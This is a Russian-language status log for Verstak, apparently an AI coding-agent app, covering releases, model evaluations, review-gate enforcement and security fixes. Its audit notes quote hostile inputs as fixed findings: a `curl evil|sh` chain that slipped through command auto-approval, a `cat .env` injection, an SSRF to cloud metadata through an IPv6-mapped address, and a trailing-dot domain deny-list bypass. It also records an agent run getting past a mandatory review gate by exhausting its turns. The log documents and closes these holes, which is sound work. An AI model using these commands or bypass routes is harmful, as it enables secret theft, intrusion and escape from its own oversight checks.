# STATUS — Verstak

> Единый живой план работ. Открой — и сразу видно: что в проде, что осталось, что в бэклоге.
> **Обновляется в конце каждой рабочей сессии.** Не держи это в голове — держи здесь.

**Обновлено:** 2026-07-05 · **В проде:** `1.8.0` 🚀 (GitHub Release + installer опубликованы; автообновление активно) · **Тесты:** 2096 зелёных / 7 skipped · **Ветка:** main · **Хвост:** UI click-smoke настроек/CLI на установленной сборке после автообновления

> **v1.8 audit/foundation (04.07, in progress).** Исправлен product-блокер внешнего контекста: `read_file`/`list_directory` теперь принимают явный абсолютный путь как read-only context без переключения проекта, при этом write/apply/run/git/undo остаются внутри project root, а `.env`/`.ssh`/keys/credentials блокируются. Live-check: активный проект Verstak прочитал внешний `C:\Users\Pavel\Progetc\_artifacts\Sistems\skills\pavel-dev-hq\SKILL.md` (7481 символ). Внешний китайский v1.8 sprint и внутренние планы сверены; рабочий scope записан в `docs/VERSTAK_1.8_AUDIT_PLAN.md`: брать model-registry foundation, Proof PDF+Telegram, Agency/Pipeline visibility, release docs; отложить Remote Pulse full control, full headless agency parity и большой `ai.ts` refactor. **Stage 14:** добавлен `electron/ai/model-registry.ts`, `kimi-k2.7-code` получил явный 256K context limit, Moonshot Settings синхронизирован на `kimi-k2.7-code` как default, UI-каталог цен показывает Kimi K2.7 как priced API model; targeted registry/catalog suite 12/12 pass. **Stage 15:** добавлены `proof:export-pdf` и `proof:send-telegram`, preload/types обновлены, Telegram `send_document` теперь умеет отправлять локальный `document_path` multipart; targeted Proof/Telegram suite 14/14 pass. **Stage 16:** в Runs panel рядом с Proof Pack появились действия `PDF` и `Telegram`, чтобы delivery был виден без отдельного экрана; `npm run type` pass.

> **Релиз 1.8.0 ВЫКАЧЕН (04.07, `b5ec546`, tag `v1.8.0`, GitHub Release id=348983461).** Version bumped `1.6.3 -> 1.8.0` in `package.json`/`package-lock.json`; added `CHANGELOG.md` and `docs/MIGRATION-v1.8.md`. Checks passed: `npm run type`, `npm run test:fast` (2093 passed / 7 skipped), `npm run build`, `npm run dist:win`. Artifacts verified and uploaded: `Verstak-Setup-1.8.0-x64.exe` 343.6 MB, `Verstak-Portable-1.8.0-x64.exe` 199.8 MB, `latest.yml` 351 B. Public GitHub check: `releases/latest` = `v1.8.0`, all 3 assets `uploaded`, public `latest.yml` returns 200 and matches local version/path/size/sha512.

> **Post-1.8 settings hardening (05.07, local PASS).** В Settings → Провайдеры добавлена явная кнопка `Найти CLI`: она заново проверяет Claude Code / Gemini CLI / Grok Build / Codex CLI / совместимые CLI на машине, показывает найденные CLI даже при пустом результате и даёт быстрый `Логин` для поддерживаемых провайдеров. В Settings → Модели и ModelPicker вынесены видимые правила default model policy: Kimi K2.7 Code = основная, DeepSeek Chat = запасная, Qwen = allowed/not default, fast/reasoner/GLM/MiniMax = не agent-mode. Левая навигация Settings перегруппирована в смысловые блоки (`Приложение`, `AI и модели`, `Интеграции`, `Контроль агента`, `Проектные данные`) и получила поиск по разделам. Проверки: `npm run type`, targeted model-catalog suite 5/5, `npm run test:fast` 2096 passed / 7 skipped, `npm run build` pass.

> **Post-1.8 hardening (05.07, deployed).** Gateway preset remap shipped through `agi-iri` source + production `/opt/iri-gateway`: `verstak/balanced` + `verstak/coder` → `kimi-k2.7-code` (`moonshot/kimi-k2.7-code`), `verstak/fast` → `deepseek-chat`. Server restart passed `/health` (`models_count=258`), server runtime `public_verstak_presets()` verified target models, public `/v1/models` includes all 3 presets. Runs panel now shows a compact Agency pipeline rail per run: Plan → Patch → Verify → Review → Proof, derived from actual run events.

> **Релиз 1.6.3 — Agency Outcome Loop hardening (04.07, release bump).** Версия поднята после Stage 11/12 и Agency full-loop smoke: headless/gateway parity, cheap model policy, обязательный review gate перед Proof Pack, proof artifacts `.json/.html/.md`, delegate gateway base-url preservation и полный smoke `create_plan → approval → patch → attest_verification → review_before_commit → Verify → Review → Proof Pack`. Это новый patch-release поверх опубликованного 1.6.2, чтобы latest/update metadata честно отражали свежий код и installer не маскировал новые изменения под старый номер.

> **Релиз 1.6.2 ВЫКАЧЕН (04.07, `7bfa1f7`, tag `v1.6.2`, GitHub Release id=348874274).** Объединённый main с 1.5.50: skill/recipe layer, надёжность tool-calling (OpenAI-совм.), напоминания + crash-resume + панель прогонов (зона Ильи, мёрж), экспорт транскрипта, dedup-фикс activity-стрима. **Сделано:** version 1.6.1→1.6.2, changelog (источник `sync-verstak-changelog.cjs` + автоген `official-changelog.ts`, 55 версий), `npm run test` 2047✓, `dist:win` → Setup 343.6 МБ + Portable 199.8 МБ + `latest.yml`, `deploy:local` (Павел на 1.6.2), push main+tag, **GitHub Release опубликован** (все 3 ассета `uploaded`, `latest.yml`→1.6.2, sha512 сходится, проверено публичным API). Публикация — напрямую через GitHub API токеном из Git Credential Manager (`gh`/`GH_TOKEN` в среде нет). Авто-обновление у пользователей подхватит 1.6.2.

> **Этап 12 — Default Model Policy / Agent Routing (04.07, local PASS).** Результаты 45-run Stage 11 matrix превращены в runtime policy: добавлен `electron/ai/agent-model-policy.{json,ts}` с явными `agentMode`, roles, recipes, `toolMode`, alias/remap notes. **Дефолты:** provider `verstak-gateway`; coding/planner/reviewer → `kimi-k2.7-code`; coding fallback/fast-edit → `deepseek-chat`; `qwen3-coder` allowed/fallback, но не default для required-review bugfix; `verstak/fast`/`verstak/coder/fast` not recommended for agent mode; `verstak/balanced`/`verstak/coder/balanced` рекомендуются к remap на Kimi. **Routing:** Electron Gateway spec/default, Settings/Onboarding/ModelPicker, `smart-router`, `tier-router` и headless `verstak recipe run` теперь используют policy; явный user `--model` сохраняется и не блокируется. **CLI acceptance:** dry-run без `--provider/--model` даёт trace `verstak-gateway / kimi-k2.7-code`; dry-run с `--model qwen3-coder` сохраняет Qwen; `model_verstak_gateway=verstak/fast` в settings не становится recipe default. **Docs:** README, Gateway provider doc и cheap-eval summary обновлены; server-side Gateway remap оставлен отдельной задачей, если mapping живёт в другом repo. **Проверки:** `npm run type` зелёный; targeted policy/Gateway/router/CLI suite 42/42; `npm run test:fast` — 2072 passed / 7 skipped; secret values не логировались, тестовый ключ в CLI trace не попадает.

> **Verstak 1.7 — Agency Outcome Loop, рабочий срез (04.07, local PASS).** Существующий Pipeline усилен до сквозного agent workflow: UI entrypoint теперь запускает `agency` task, execute-промпт требует `attest_verification` и затем `review_before_commit`, после Verify добавлен отдельный шаг `Review`, а переход в Proof Pack разрешён только при timeline-событии `review_before_commit` со статусом pass marker `REVIEW GATE: ПРОЙДЕНО`. `review_before_commit` теперь пишет явный timeline/tool_call event, поэтому gate виден в Runs/Proof. Закрыт сценарный разрыв: если gate дожали follow-up send в том же чате, Review step и Proof Pack находят этот pass, но основной proof остаётся привязан к execute-run. Proof Pack расширен до `proof.json + proof.html + proof.md`, содержит блок `reviewGate` и редактирует строки через существующий secret scanner. **Проверки:** targeted pipeline/proof/review suite 74/74; `npm run type` зелёный; `npm run test:fast` — 2079 passed / 7 skipped; `npm run build` зелёный (только старые Vite dynamic-import warnings). **Ограничения:** Telegram delivery, PDF Proof Pack и headless parity для полного Agency UI-loop не трогались; gateway/provider слой не менялся.

> **Agency Outcome Loop full-loop smoke (04.07, PASS; supersedes UI-only note below).** `npm run smoke:agency-ui` теперь проверяет не только wizard/IPC, а полный локальный агентный путь через fake OpenAI-compatible Verstak Gateway без реальных ключей: `create_plan` → user approval → `apply_patch` → `attest_verification` (`node --test calc.test.mjs`) → `review_before_commit` с независимым delegate-reviewer → Verify → Review → Proof Pack. Smoke создаёт временный git-workspace с красным тестом `add(2,3)`, агент исправляет только `calc.mjs`, unrelated files не трогает, post-verify exit=0, proof files `.proof.json/.proof.html/.proof.md` появляются. Найдено и закрыто 2 runtime/UI gap: sub-agent/delegate теперь наследует `verstak_gateway_baseurl` для `verstak-gateway` (review gate не уходит мимо локального gateway/kill-switch), а Verify-banner читает verification по `agentRunId` через `latestByRunId`, чтобы зелёная кнопка Review появлялась для реального execute-run. Проверки: `npm run smoke:agency-ui` PASS; повторный `node scripts/smoke-agency-ui.mjs` PASS; `npm run type` PASS; `npm run test:fast` PASS (2079 passed / 7 skipped). Секреты не читались и не логировались; providerCall=`fake-local-openai-compatible`, realNetwork=false.

> **Agency Outcome Loop live UI smoke (04.07, historical UI-only PASS).** Добавлена воспроизводимая команда `npm run smoke:agency-ui`: она пересобирает native-модуль под Electron, собирает приложение, запускает собранный Electron в изолированном `--user-data-dir` и временном workspace без реальных ключей. Закрыт launch bug: главное `BrowserWindow` теперь удерживается сильной ссылкой до `closed`, иначе окно могло закрыться сборщиком мусора до smoke. В пустом чате добавлен видимый quick entrypoint `Agency task`; CDP-smoke подтвердил: кнопка видима и кликается, wizard открывается, цепочка `Brief → Plan → Execute → Verify → Review → Proof` видна, 3 поля brief есть, старт заблокирован до заполнения и включается после заполнения. Дополнительно smoke проверяет настоящий preload IPC/storage: `pipeline:start` создаёт `mode=agency`/`step=plan`, `pipeline:getActive` возвращает этот run, `pipeline:cancel` убирает его из активных. Этот блок оставлен как исторический срез; актуальный smoke выше уже нажимает Start и проходит весь агентный путь до Proof Pack.

> **Этап 11 — Cheap Model Eval Matrix + default model policy (04.07, live eval PASS).** Добавлен reproducible eval runner `scripts/eval-cheap-models.mjs`: генерирует 5 безопасных временных workspaces (`small-edit`, `bugfix`, `typescript-error`, `test-fix`, `review-before-commit`), гоняет настоящий `verstak recipe run` через `verstak-gateway`, снимает trace/diff/verify/review-gate метрики и пишет markdown+JSON отчёт. **Live matrix:** 45 строк через локальный GUI Gateway key из safeStorage (только in-memory env, значения ключей не печатались/не писались); `traceSecretLeak=0`, scan отчёта по key-паттернам clean. **Результаты:** `kimi-k2.7-code` (`moonshotai-kimi-k2`) — 5/5 strict pass и становится default coding/reviewer/planner; fallback coding — `deepseek-chat` (pass: `small-edit`/`bugfix`/`typescript-error`/`test-fix`, fail только standalone `review-before-commit`); `qwen3-coder` — 4/5, но bugfix fail-closed без gate; `verstak/coder` — 4/5, bugfix gate fail; current `verstak/fast` — 1/5 и не годится в agent mode; current `verstak/balanced` — 4/5, но slow и fail на `small-edit`; `deepseek-reasoner` not tested (`network-error`), `minimax-m1` not tested (`400`), `z-ai/glm-4.6` не годится для agent mode (1/5). **Policy:** `verstak/coder/fast` надо маппить на `deepseek-chat` или держать вне agent mode; `verstak/coder/balanced` — на `kimi-k2.7-code`; recipe map: `bugfix`/`test-fix`/`typescript-error`/`review-before-commit` → `kimi-k2.7-code`. **Артефакты:** `docs/cheap-model-eval-2026-07-04.md` + `.json`. **Найдено:** баг нового eval harness на Windows/кириллическом пути (`import.meta.url` нужно читать через `fileURLToPath`) — исправлен; runtime-багов headless recipe runner/gateway path не найдено. **Проверки:** `npm run type` зелёный; targeted `tests/scripts/eval-cheap-models.test.ts` 2/2; полный `npm run test:fast` — 2062 passed / 7 skipped.

> **Этап 10 — CLI Provider/Gateway Parity (04.07, `ccefb0b`→`8186e2a`, live-smoke PASS).** Headless CLI теперь знает `verstak-gateway`, `VERSTAK_GATEWAY_API_KEY`, `--provider-config` и порядок resolution: явные CLI args → named provider config (`.verstak/settings.json` / `~/.verstak/settings.json`) → settings/env fallback → понятная ошибка. Для gateway синхронизированы baseUrl/fallbackBaseUrl и модели `verstak/*`, старый env-provider path не сломан. **Проверки:** локально `npm run type` зелёный, `npm run test:fast` — 2060 passed / 7 skipped; targeted CLI suite 14/14 (`provider-config`, `recipe`, streaming tool-call name). На сервере `ailos178` smoke-ветка `smoke/cli-provider-gateway-parity` на `8186e2a`: `npm run type` зелёный, targeted CLI suite 14/14; полный Linux `test:fast` падает только на 3 старых Windows-path теста (`installer-paths`, `storage/projects`), не на Stage 10. **Live-smoke через Verstak Gateway:** локальный GUI key из safeStorage передавался на сервер только in-memory по SSH stdin, на диск не писался и не печатался; `cli doctor` увидел gateway source=`env`; `/v1/models` и chat probes приняли `deepseek-chat`, `qwen3-coder`, `kimi-k2.7-code`, `verstak/coder/fast/balanced`. `bugfix + deepseek-chat` и `bugfix + qwen3-coder` прошли через `provider=verstak-gateway` + `--provider-config`: baseline taken yes, first mutating tool `apply_patch`, `reviewGate=pass`, verify `npm run type`/`npm run test:fast` pass, внешний verify pass, diff только `calc.mjs: return a - b -> return a + b`, `unrelated.mjs` не тронут, secret leak no. **Вывод:** проблема предыдущего smoke была не в валидности ключа, а в том, что server headless env не видел GUI safeStorage key.

> **Этап 9 — Headless Recipe Runner / CLI parity (04.07, локально+server smoke, `379684d`→`d3a4551`→`444bbf0`).** CLI получил настоящий минимальный recipe entrypoint: `verstak recipe run --recipe <id> --provider <provider> --model <model> --workspace <path> --task "..."`, плюс `--max-turns`, `--trace-json`, `--dry-run`. **Сделано:** CLI грузит 6 built-in coding recipes, рендерит protocol тем же текстом, что GUI (`renderRecipeProtocol` parity закреплён тестом), прокидывает recipe protocol в system prompt и пишет machine-readable trace: provider/model, recipe id, tool calls, first mutating tool, baseline, verify commands, review gate, final status/failure reason. **Enforcement:** перед первым мутирующим tool-call (`write_file`/`apply_patch`/`edit_file`/`create_file`/`apply_diff`) снимается in-memory baseline для `verify.commands`; pre-existing red не блокирует, новые ошибки блокируют. Для `reviewer.required` финал без passed `review_before_commit` запрещён: один corrective nudge → затем fail-closed/non-zero exit; max-turns до gate тоже fail-closed. `review_before_commit` в CLI проверяет allowlist verify-команд, `git diff`, baseline-aware verify и возвращает pass marker только при зелёном результате. **Проверки:** targeted headless suite 8/8 зелёных (`tests/scripts/verstak-cli-recipe.test.ts`, `tests/scripts/verstak-cli-toolname.test.ts`): loads recipe, protocol parity с GUI, baseline before first mutation, required review fail-closed, passed gate allows final, dangerous command blocked, streaming tool-call name regression. Pre-commit hook прошёл `type-check` + полный `test:fast`; локально перед smoke: `npm run type` зелёный, `npm run test:fast` — 2054 passed / 7 skipped. **Live-smoke PASS на сервере `ailos178` через временную ветку `smoke/headless-recipe-runner`, main до smoke не пушился, секреты не печатались/не писались на диск:** ключи `DEEPSEEK_API_KEY`/`OPENROUTER_API_KEY`/`QWEN_API_KEY`/`MOONSHOT_API_KEY` логировались только как `present: yes`; `deepseek/deepseek-chat + bugfix` прошёл (baseline taken yes, first mutating tool `apply_patch`, verify pass, review gate pass, diff только `calc.mjs`, trace secret leak no); `openrouter/qwen/qwen3-coder + bugfix` прошёл с теми же критериями; `review-before-commit + reviewer.required` прошёл (protocol rendered yes, `review_before_commit` вызван 1 раз, gate pass, final success). **Ограничения:** CLI runner минимальный, без нового UI и без benchmark harness; built-in recipe definitions в CLI пока зеркалятся из GUI, но drift protocol/steps/verify/reviewer ловится тестом; `verstak-gateway`/`verstak/*` уже есть в Electron GUI provider layer, но headless CLI в этом этапе работает по текущему `--help` contract (`deepseek`/`openrouter` и др.) и отдельный `verstak-gateway` CLI-provider не добавлялся из-за hard constraint “не добавлять provider”.

> **Этап 7 — GUI-dogfood recipe enforcement на живой дешёвой модели + 2 фикса (04.07, в main+push, `e2f9922`).** Живая проверка Этапа 6 (P1 авто-baseline + P2 mandatory review gate) на `deepseek-chat` в git-песочнице (`Downloads/verstak-dogfood`: багованный `sum.mjs`, падающий `node --test`, recipe `/bugfix`). **6 прогонов, все три защиты доказаны по логам `agent_run_events`:** P1 baseline снимается перед первой правкой (событие `verify | recipe baseline | npm run type: exit 0; test:fast: exit 1` — pre-existing red не вешается на модель); P2 nudge форсит `review_before_commit` перед финалом (событие `tool-blocked` «вызови гейт»); fail-closed реально стопит (прогон `d0e88896` → `status=failed` при несоблюдении). **2 найденных и закрытых дефекта (`e2f9922`):** (1) **max-turns bypass** — при исчерпании бюджета ходов с активным `reviewer.required` и непройденным гейтом прогон помечался `done`; теперь `exitReason='error'` → `failed` (fail-closed), «+ходы» для продолжения сохранены (`ipc/ai.ts` перед `turns-exhausted`); (2) **allowlist-петля** — `review-gate` отбивал `node --check`/`node --test` (verify-примитивы вне allowlist) → модель зацикливалась «вызови гейт → гейт отбил verify → ходы кончились»; добавлен паттерн `/^node\s+--(check|test)\b/` в `isAllowedVerifyCommand` (произвольный `node <script>` по-прежнему заблокирован). **Проверки:** `npm run type` зелёный · `tests/ai/review-gate.test.ts` 41/41 (+кейсы node-allow + node-deny) · вся `tests/ai` 1101 passed. Pre-commit hook (type+тесты) прошёл. **Ложная тревога (закрыта):** «утечка GitHub-токена в резюме» — падение `session-summary.test.ts` оказалось ABI-шумом sqlite (`NODE_MODULE_VERSION 143 vs 137`, dev держал `.node`), а не багом — `session-summary.ts:64` уже редактирует через `scanText`. **Открытый design-хвост (не критичен):** реальный `review_before_commit` требует git-репо (`git diff` пуст в non-git → gate fail) — задокументировано; в песочнице обошли `git init`. **Найдены (не мои, из мёржа Ильи, на отдельную задачу):** дубли React-key `..._attest_verification` + `Maximum update depth exceeded` (зацикленный ре-рендер) в dev-логе.

> **Этап 6 — recipe enforcement: авто-baseline + mandatory review gate (04.07, в main, `30e4eab`→`085435c`).** Recipe с `verify`/`reviewer.required` больше не зависит от дисциплины модели в двух местах (закрыты product-gap Этапа 5). **P1 авто-baseline (`30e4eab`):** для active recipe с `verify.commands` runtime лениво снимает baseline verify ДО первого мутирующего tool-call (`write_file`/`apply_patch`/`edit_file`) — in-memory per-run, без БД/диска. `review_before_commit` берёт этот baseline через `ctx.getRecipeBaseline()`, если модель не передала его аргументом. fail-closed: не-allowlisted/policy-blocked/упавшие команды не попадают в baseline → их отсутствие делает gate строгим (нет false-pass); allowlist + command-policy не обходятся. **P2 mandatory gate (`085435c`):** при `reviewer.required` runtime отслеживает успешный `review_before_commit` (маркер `REVIEW GATE: ПРОЙДЕНО` в результате tool-вызова, не текстовая имитация). Попытка финала без пройденного gate → один corrective nudge (`decideReviewGate`, bounded 1) с требованием вызвать тул; если модель снова не зовёт → fail-closed остановка с понятной причиной. Enforcement ТОЛЬКО для active recipe — обычные skills/chat/agent runs не задеты (проверено тестом). Точки внедрения: `ipc/ai.ts` (run-контекст `AgentRunContext.recipe`, снапшот перед dispatch, enforcement в обеих точках финала), `ai/review-gate.ts` (чистые хелперы `snapshotVerifyBaseline`/`decideReviewGate`/`isReviewGatePassResult`/`isMutatingToolName`), `tool-handlers/{shared,review-before-commit}.ts` (baseline reuse). Agent loop не переписан, delegate/reviewer-override recipe не наследуют (нет рекурсивного enforcement). **Проверки:** `npm run type` зелёный · `npm run test:fast` — 2041 passed / 7 skipped / 0 failed (+21 тест: P1 snapshot/mutating + P2 decide/marker/messages). **Честные ограничения:** baseline снимается «перед первым мутирующим tool» (не в самый старт run) — минимальный безопасный вариант; покрыт набор file-edit/patch тулз, не `run_command`-as-mutating; enforcement — nudge→fail-closed stop (runtime сам gate не вызывает — по ТЗ минимально безопасный путь); recipe с reviewer.required без изменений (пустой diff) тоже упрётся в gate-fail (осознанно, coding-рецепт ждёт правок); loop-level поведение покрыто через unit чистых решателей, не полный e2e agent-loop. **P3 (reviewer/fixer на другой модели) и P4 (headless recipe-runner) — НЕ делались (вне scope).**

> **Этап 5 — recipe-runtime e2e на дешёвых моделях (04.07, в main, `eba5a46`).** Валидация, что recipe/runtime-слой работает как рельсы. **Детерминированный слой (суть рельсов) — 26/26 зелёных на реальных модулях:** suggestion (5 сценариев+приоритет), injection (6 протоколов несут read_set/steps/verify/stop/reviewer), gate fail-closed (invalid/empty/confidence<0.7/not-inspected/verify-not-run), baseline (pre-existing не блокирует, новая блокирует, нет false-pass). **Live-прокси через CLI (серверные ключи agi-iri, sandbox bugfix):** ✅ Gemini-3.5-flash, DeepSeek-chat, DeepSeek-reasoner, Kimi-K2, GLM-4.6, MiniMax-M1, Qwen3-coder — ВСЕ прошли по протоколу (inspect→read→patch→verify=PASS→summary, минимальный diff, `unrelated.mjs` не тронут). ❌ Qwen-2.5-coder-32b — нет tool-use через OpenRouter (404). ❌ Groq — HTTP 403 geo-block (РФ). **Найденный и исправленный баг:** `verstak-cli.mjs` аккумулировал имя streaming tool-call через `+=` → «read_fileread_file» → DeepSeek/Qwen сдавались («tools unavailable»); фикс — присваивание (как GUI-парсер `openai-compat.ts:194`) + регрессия-тест (мок ollama-эндпоинта). **Архитектурная находка:** recipe/gate/baseline живут ТОЛЬКО в Electron-loop; CLI — отдельный runtime без рецептов → «настоящий» headless e2e рецептов невозможен без GUI (harness = стоп-условие, не делал). **3 гипотезы (по фактам):** (1) авто-снапшот baseline на старте — ДА, нужен (сейчас агент передаёт аргументом, легко забыть); (2) enforce `review_before_commit` — ДА, дешёвые модели не зовут gate сами, нужен recipe-level принудительный финальный шаг; (3) reviewer/fixer на другой модели — желательно (свежий контекст ≠ иная слепая зона). **Следующий кодовый этап — по подтверждению Павла.**

> **Skill/Recipe Layer for coding (04.07, Этап 4, в main, не зарелизено, `8d51daf`→`1aeede3`).** Завершён. Recipe-слой поверх skills: дешёвые модели работают по жёсткому workflow-протоколу `read_set → small patch → verify → review gate → bounded autofix`, а не в свободном агентном режиме. **A frontmatter** (`8d51daf`) — `RecipeSpec`/`RecipeStep`/`RecipeCompensation` в skill-типах + fail-soft `parseRecipe`. **B built-in** (`3d3a76b`) — 6 inline recipe-skills: `small-edit`/`typescript-error`/`bugfix`/`test-fix`/`refactor-safe`/`review-before-commit`, каждый с trigger/read_set/steps/verify/reviewer/stop. **C injection** (`84ac7ef`) — `renderRecipeProtocol` инжектит протокол активного recipe в system prompt (main-side, через `AiSendOverrides.recipe`; обычные skills не задеты). **D suggestion** (`29ae326`) — детерминированный `suggestRecipe` по ключевым словам (tsc→typescript-error, vitest→test-fix, …), только chip, без auto-run. **F baseline-aware verify** (`4743874`) — `baseline-verify.ts`: снимок verify до/после, сравнение по нормализованным сигнатурам, pre-existing red НЕ блокирует, новые ошибки — блокируют. **E review gate** (`1aeede3`) — tool `review_before_commit`: verify (allowlist, fail-closed) → diff → `delegate(critic)` свежий контекст → строго-JSON вердикт fail-closed (невалидный/пустой JSON, confidence<0.7, не осмотрен diff, verify не запускалась = FAIL) → до 2 циклов `delegate(executor)` авто-починки свежим контекстом → повторная verify+ревью → стоп с причиной. Agent loop/provider layer не переписаны; mode-policy/command-policy не обходятся. **Проверки:** `npm run type` зелёный · `npm run test:fast` — 2020 passed / 7 skipped / 0 failed (+68 тестов слоя). **Честные ограничения:** reviewer/fixer используют существующий delegate (тот же провайдер по умолчанию — «свежесть» = чистый контекст, не обязательно другая модель); baseline передаётся recipe-агентом как аргумент tool (нет авто-снапшота на старте прогона в самом gate); recipe suggestion — эвристика по ключевым словам (не семантика). **Следующий этап — по подтверждению Павла.**

> **Agentic fallback routing (03.07, Этап 2, в main, не зарелизено, `8c00947`).** Завершён. `classifyFallbackReason`/`fallbackPlan` проброшены в реальный агентный цикл `runApiConversation` — закрыты поведенческие сбои tool-calling у DeepSeek/Qwen/Kimi/GLM. **Закрытые сценарии:** ① ignored tools → nudge → эскалация native→JSON-режим (`ctx.forceToolMode`, тот же провайдер) → fallback model; ② malformed native arguments → typed `argsError` (вместо тихого `{}`) → один bounded corrective retry «повтори валидным JSON» → fallback; ③ context overflow → форс-компакция существующим summary-компактором → retry, не помогло → понятная ошибка (не бесконечный цикл); ④ auth error в середине прогона (бан Claude) → смена провайдера без потери накопленной истории; ⑤ rate/network/5xx — старый turn-0 fallback не тронут. Все retries bounded (`MAX_MALFORMED_RETRIES=1`, `MAX_CONTEXT_RETRIES=1`, JSON-эскалация одноразовая). `mode-policy`/`command-policy` не обходятся (проверено тестом write_file в plan-режиме). native-путь стабильных моделей не деградирует (deepseek-chat остаётся native). **Проверки:** `npm run type` зелёный · `npm run test:fast` — 1952 passed / 7 skipped / 0 failed (+6 тестов реального agent loop). **Честные ограничения:** `empty_tool_call_arguments` пока не классифицируется на provider-level (нет schema-валидации — чтобы не ломать no-arg тулзы); summary-вызов форс-компакции в error-ветке не учитывается в cost-guard (bounded 1×); JSON-эскалация одноразовая на прогон; provider-fallback на reasoning-модель не всегда доинжектит JSON-инструкцию. **Следующий этап — по подтверждению Павла.**

> **1.5.50** 🚀 — **полный аудит приложения по 8 осям (память/баги/безопасность/целостность/мусор/правильность/читаемость/vs-OpenCode) + фиксы.** Многоагентный аудит (Workflow, 39 агентов, адверсариальная верификация) → **32 находки, 28 подтверждено**; закрыты все дефекты (7 HIGH + 2 MEDIUM + LOW) тремя пачками по TDD. **Безопасность:** утечка секретов в память без scanText (авто-захват + memory_save); инъекция `!\`cat .env\`` в slash-команде мимо isForbiddenPath; http-коннектор слал Authorization на хост редиректа; SSRF без DNS-резолва на редирект-хопах коннекторов. **Надёжность (баги):** smart-fallback между провайдерами НЕ срабатывал (провайдеры yield'ят error вместо throw → catch недостижим) + backoff-retry тоже мёртв — вынесен `attemptProviderFallback` + `retriableValue` в withInitialRetry; recall фильтровал session-summary ПОСЛЕ LIMIT → факты выпадали; стрим фонового чата терялся/прилипал при смене проекта; loop-detection оставлял висячие tool_call → 400. **Мусор:** 2 мёртвых компонента (342 стр), мёртвые импорты/экспорты/функции/переменные. **Корректность:** cron dow=7/`*/N`, откат-чекпоинт floor-ordering, decay не удаляет decision/bug/preference. **Ось 8 (vs OpenCode):** глобальный слой правил `~/.verstak/RULES.md`. Коммиты f620cff (security), 3831d23 (bugs), b766664 (cleanup), c2c9262 (user-layer). Деливерабл аудита: `wm1ns4h3o.output`. **Отложено (enhancement, не дефекты):** 4 OpenCode-фичи M/L (edit+rerun сообщения, ручной `/compact`, экспорт транскрипта в MD, undo+redo) + рефактор монолита runApiConversation (~840 стр, §5) + drainSupplements DRY + разрозненные unused-locals + unused-экспорты autoupdate (зона Ильи).

> **1.5.49** 🚀 — **per-domain web-политика (+1 спринт).** Капстоун веб-раунда и усиление moat «контроль»: файл `.verstak/web-policy.json` (user+project) ограничивает, какие домены агенту можно фетчить (`web_fetch`). `allow` = белый список, `deny` сильнее (чёрный); нет файла → все публичные (обратная совместимость). Паттерн `python.org` = домен+субдомены, `*.mozilla.org` = только субдомены. Проверка на КАЖДОМ хопе редиректа (нельзя увести цепочкой перенаправлений). Прямой Claude-Code-паритет (`WebFetch(domain:…)`) + defense-in-depth поверх SSRF. Самопроверка на обходы поймала trailing-dot (`evil.com.` резолвится=evil.com, обходил deny) → нормализация FQDN. +11 тестов, движок чистый (`web-policy.ts`).

> **1.5.48** 🚀 — **конкурентная ось Cursor/CC/Codex, раунд 2: веб-доступ агента + запоминание одобрений + кэш истории.** Повтор ночного /goal-спринта. Разбор конкурентов → главный ПРОБЕЛ = веб-доступ (есть у всех троих, у нас не было). **Спринт 1 (эффективность+контроль):** ① **кэш истории переписки** (prompt caching на растущем префиксе диалога, 3-й breakpoint ≤4, поверх 1.5.47) · ② **«Больше не спрашивать про такие команды»** (persistent per-command approvals, чекбокс в CommandConfirm → prefix-правило в `~/.verstak/permissions.json`) · ③ **`web_fetch`** (SSRF-огороженный фетч страницы → текст). **Спринт 2 (охват):** ④ **`web_search`** (DuckDuckGo HTML, без зависимостей). Оба веб-тула гейтятся `web_access` (по умолчанию ВЫКЛ, тумблер в «Что разрешено»). **Два раунда ревью (2 агента + Workflow 12 агентов × адверсариальная верификация) → 15 находок, ВСЕ закрыты:** 🔴CRITICAL SSRF через IPv4-mapped IPv6 в hex-форме (`http://[::ffff:a9fe:a9fe]`=metadata — `new URL` нормализует в hex, строковый матчер пропускал) → числовой IPv6-парсер (mapped/NAT64/IPv4-compat); 🟠HIGH allow авто-одобрял `npm test && curl evil|sh` (по `.some` одного сегмента) → покрытие ВСЕХ сегментов; 🟠HIGH денилист опасных субкоманд протекал по неполноте (`npm install`/`git submodule`/`kubectl apply`/`go install` = RCE) → **реверс на allowlist безопасных** (глухая защита, не течёт); 🟠HIGH ReDoS-фриз event-loop на враждебной странице → линейный strip через indexOf (O(n)); MEDIUM×5 (гейт только презентационный→execution-time проверка, UTF-8-обрезка→стриминговый decoder, незакрытый `<svg>` терял тело→skip-only-tag, opaque `?token=` в finalUrl не редактировался→redactUrlSecrets в result+Timeline+audit); LOW (сдвиг сниппетов, мусорные правила от обёрток). **Урок в третий раз: security-фиксы ОБЯЗАТЕЛЬНО ре-ревьюить Workflow'ом — «лиса в курятнике», второй раунд нашёл ещё 5 в моих же фиксах, вкл. HIGH-неполноту денилиста.** В описаниях про конкурентов — молчок, только функции. + починка автогена changelog (апостроф ломал одинарно-кавыченный литерал).

> **1.5.47** 🚀 — **токен-экономия: prompt caching (все провайдеры) + фикс потери фактов памяти.** По разбору статей Claude Code (thecode/vc.ru/habr): из ~16 техник у нас было **13** (компакция, субагенты-саммари, model-routing, thinking-бюджет, сжатие tool-output, node_modules-исключение, коннекторы-как-код=2 тулзы vs 31 MCP). **Единственная крупная дыра — prompt caching, был выключен у ВСЕХ провайдеров.** Фикс — связка из 3 правок: разделение системного промпта на СТАБИЛЬНЫЙ префикс (system-layer+user+skill+tools) и ИЗМЕНЧИВЫЙ хвост (context-pack) через `CACHE_BREAKPOINT`; claude.ts режет по маркеру + `cache_control:ephemeral` на стабильном блоке; для OpenAI/DeepSeek/Gemini `systemForProvider` снимает маркер → авто-кэш попадает по стабильному префиксу. **Экономия ~60-80% входных токенов на длинной сессии.** + **память: фикс потери фактов при переполнении core-memory** (архив-ПЕРВЫМ: эвакуация ДО обрезки, падение saveMemory не рушит core). **Ре-ревью (9 агентов) → 5 находок, все закрыты:** 🔴HIGH мой же фикс памяти внёс новый loss-путь (обрезка до архива); MEDIUM file_scoped_rules в кэшируемом префиксе (money-waster) → в volatile; MEDIUM компакция теряла базовый протокол+маркер → сохраняет; MEDIUM вырожденная длинная строка; LOW маркер протекал в autonomous. **Урок повторно: security/эффективность-фиксы ре-ревьюить — фикс сам вносит регрессию.** Честная сверка памяти с Hermes: мы АРХИТЕКТУРНО ЗРЕЛЕЕ (soft-invalidate/decay/пассивный+процедурный захват — у Hermes нет), «ощущение что Hermes лучше» = именно этот overflow-баг. 